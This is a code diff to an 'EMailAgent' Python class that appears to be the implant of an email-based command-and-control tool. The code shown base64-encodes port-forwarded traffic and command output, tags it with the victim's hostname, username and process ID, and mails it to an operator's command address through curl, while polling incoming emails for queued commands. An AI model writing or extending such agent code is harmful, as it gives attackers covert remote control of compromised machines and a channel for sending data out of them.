@@ -54,35 +54,26 @@ class EMailAgent(LocalAgent):
     
 	curlLock = threading.Lock()
 
+	def __init__(self):
+		LocalAgent.__init__(self)
+
 	def pushForward(self, forwardID, data):
-		print("Pushing")
 		if not forwardID in self.forwardQueues:
 			self.forwardQueues[forwardID] = queue.Queue()
-		print("Encoding")
 		im_b64 = base64.b64encode(data).decode('ascii')
-		print("subject forming...")
 		subject = self.PORTFORWARD_EMAIL_TAG + forwardID + " " + self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG);
-		print("Sending")
 		self.sendEmail(subject, im_b64);
-		print("Sent")
 
 	def processNextEmail(self):
 		try:
-			print("Locking");
 			self.curlLock.acquire()
-			print("Polling");            
 			email = self.getNextEmail()
-			print("Releasing");            
 			self.curlLock.release()
-			print("Released");            
 			if(email.subject.startswith(self.PORTFORWARD_EMAIL_TAG)):
 				elements = email.subject.split(" ")
-				print("Forward");
 				forwardID = elements[1]
 				self.forwardQueues[forwardID].put(email.body)
-				print("Forwarded");
 			else:
-				print("Next!");            
 				self.q.put(email.body)
 			return "Found"
 		except Exception as e:
@@ -108,22 +99,17 @@ class EMailAgent(LocalAgent):
 	
 	def sendEmail(self, subject, body):
 		#body = body.replace("\r", "")
-    
+		self.curlLock.acquire()
 		f = open(self.OUTGOING_EMAIL_TMP_FILENAME, "w", newline='')
 		f.write("From: \"" + self.EMAIL_OUTGOING_USERNAME + "\" <" + self.EMAIL_OUTGOING_USERNAME + ">" + "\n")
 		f.write("To: \"" + self.EMAIL_CMD_ADDR + "\" <" + self.EMAIL_CMD_ADDR + ">" + "\n")
 		f.write("Subject: " + subject + "\n\n")
 		f.write(body)    
 		f.close()
-
-		print("Locking for send")
-		self.curlLock.acquire()
 		sendEmailCommand = "curl --url " + self.EMAIL_OUTGOING_URL + " --user " + self.EMAIL_OUTGOING_USERNAME + ":" + self.EMAIL_OUTGOING_PASSWORD + " --mail-from " + self.EMAIL_OUTGOING_USERNAME + " --mail-rcpt " + self.EMAIL_CMD_ADDR + " --upload-file " + self.OUTGOING_EMAIL_TMP_FILENAME
-		print("Sending")
 		sendEmailResponse = subprocess.Popen(sendEmailCommand, shell=True, stdout=subprocess.PIPE).stdout.read().decode("utf-8")
-		self.curlLock.release()
-		print("Releasing send")
 		os.remove(self.OUTGOING_EMAIL_TMP_FILENAME)
+		self.curlLock.release()
 
 	def postResponse(self, cmd_output):
 		self.sendEmail(self.buildEmailSubject(self.hostname, self.username, self.pid, self.EMAIL_PROTOCOL_TAG), cmd_output);
